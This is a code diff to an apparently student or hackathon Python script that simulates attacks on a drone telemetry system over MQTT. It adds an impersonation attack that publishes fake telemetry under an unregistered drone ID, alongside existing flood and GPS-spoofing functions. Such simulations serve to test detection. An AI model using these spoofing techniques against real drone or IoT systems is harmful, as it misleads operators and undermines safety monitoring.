@@ -34,6 +34,20 @@ def flood_attack(drone_id="drone-1", count=50):
         attacker.publish(topic, json.dumps(fake_message))
     print(f"🚨 Flood attack finished — sent {count} messages instantly")
 
+def impersonation_attack(fake_id="drone-99"):
+    """Pretends to be a drone that was never registered/started"""
+    fake_message = {
+        "drone_id": fake_id,
+        "lat": 28.6139,
+        "lon": 77.2090,
+        "battery": 100,
+        "timestamp": time.time()
+    }
+    topic = f"devjams_gayathri_drones/{fake_id}/telemetry"
+    attacker.publish(topic, json.dumps(fake_message))
+    print(f"🚨 Sent impersonation attack as fake drone: {fake_id}")
+
+
 if __name__ == "__main__":
     import sys
     attack_type = sys.argv[1] if len(sys.argv) > 1 else "gps"
@@ -42,3 +56,7 @@ if __name__ == "__main__":
         gps_spoof("drone-1")
     elif attack_type == "flood":
         flood_attack("drone-1")
+    elif attack_type == "impersonation":
+        impersonation_attack("drone-99")
+    else:
+        print(f"Unknown attack type: {attack_type}")
